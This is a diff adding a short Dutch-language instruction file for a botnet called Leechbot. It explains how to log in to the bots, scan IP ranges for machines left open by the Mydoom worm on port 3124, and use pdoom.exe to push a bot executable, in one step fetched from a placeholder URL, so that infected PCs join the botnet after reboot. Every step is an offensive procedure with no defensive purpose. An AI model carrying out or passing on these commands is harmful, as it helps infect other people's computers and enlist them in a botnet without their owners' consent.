@@ -1,0 +1,17 @@
+* Mydoom scanner voor Leechbot 9.0a *
+* Mydoom scanner voor Leechbot r1.5b*
+
+Leechbot 9.0a:
+1. login command ingeven
+2. .scan.mydoom ip 3124 pdoom.exe http://www.site.com/boturl.exe
+3. wachten.. tot de bots targets vinden.
+
+Leechbot r1.5b*
+1. login command ingeven
+2. .scan ip 3124 2 doom
+3. Results die worden gevonden (e.g.: 192.168.1.5:3124) opslaan.
+4. Plaats de bot-file in c:\
+5. Plaats pdoom.exe in c:\
+6. Open pdoom.exe (in dos, via cmd of command)
+7. geef de volgende command: pdoom 192.168.1.5 3124 bot.exe
+8. Wacht tot de server is geinfecteerd. Nadat de pc opnieuw opgestart is van uw target zal deze pc als bot erbij komen
